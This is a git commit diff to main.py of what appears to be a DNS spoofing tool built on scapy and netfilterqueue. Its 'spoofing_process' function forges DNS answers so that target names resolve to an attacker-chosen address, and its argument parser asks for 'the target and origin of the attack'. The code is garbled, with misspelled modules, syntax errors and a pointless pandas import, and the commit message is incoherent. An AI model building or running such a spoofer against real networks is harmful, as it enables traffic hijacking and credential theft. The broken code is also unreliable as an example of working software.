b0d7ffc74ac97a3e6cc3d2d37b172206c4964f4f
Wilfred Apollon <dev@achila.me>
2025-05-05 13:31:12 -0500

    incremental product emergence necessitating the pandas library

--- main.py
+++ main.py
@@ -1,3 +1,5 @@
+#
+from pandas import DataFrame, MultiIndex 
 import threading
 import netfilterqueqe
 import sys 
@@ -6,6 +8,7 @@ import scapy.all as cap
 import socketserver as ss
 import asyncio as sync 
 import argparse
+import string
 
 
 logging.basicConfig(
@@ -19,14 +22,18 @@ e = threading.Event();
 
 q = netfilterqueqe.NetfilterQueqe()
 
-def __init__(self):
-    self.destination = []
-    self.origin = {}
+localaddress = ()
+
+class Address():
+    def __init__(self, address):
+        self.targets = MultiIndex.f
+
 
 def user_input_target(self, *args):
    destination = self.destination
     if args.get == ['target*']:
-        destination.append(args.get['target*'])
+        for i in args:
+            destination.append(args.get['target']) 
         return destination
     else:
         return 0 
@@ -40,7 +47,7 @@ def user_input_origin(self, *args):
     ...
 
 target_by_user = user_input_target
-origin_by_user = user_input_origin 
+origin_by_user = user_input_origin
 parser = argparse.ArgumentParser(
     description=' Enter the target and origin of the attack',
 )
@@ -52,26 +59,24 @@ def scan_prompt_data(self) -> :
 
 
 
-def discover(*args):
+def discover_host(*args):
     while args.get == ['target*'] 
-        cap.conf
+        cap.conf.
         ...
 
-def establish_target_link(target):
+def establish_link_with_target(target):
     ...
 
 
- def process(packet):
+ def spoofing_process(packet):
     packet = cap.IP(packet.get_payload())
     while packet.haslayer(cap.DNSRR):
         qname = packet[cap.DNSQR].qname 
         for i in target_by_user:
             if target_by_user in qname: 
-                print("[+] Spoofing target")
                 payload = cap.DNSRR(rrname=qname, rdata=origin_by_user)
                 packet[cap.DNS].an = payload 
                 packet[cap.DNS].ancount = 1
-
                 del packet[cap.IP].len
                 del packet[cap.IP].chksum
                 del packet[cap.UDP].chksum
@@ -81,27 +86,24 @@ def establish_target_link(target):
             packet.set_payload(str(cap_packet))
     packet.accept()
 
-queue = q.bind(0, process)
 e= threading.Event()
 
 scan_input_thread = threading.Thread(
     name=' scanning user input %()s'
-    target =
+    target = scan_prompt_data,
+    args=()
 )
 
-process_packet_thread = threading.Thread(
+process_spoof_thread = threading.Thread(
     name=' packet processing %()s'
     target= process,
     args=(e,),
-
-
 )
-
 
 def main():
   parser.add_arguemnt('end', action=, default=false);
   parser.add_arguemnt('spoof',action=,default=false);
-  process_packet_thread
+  queue = q.bind(0, process)
 
 if __name__ is __main__:
     main()
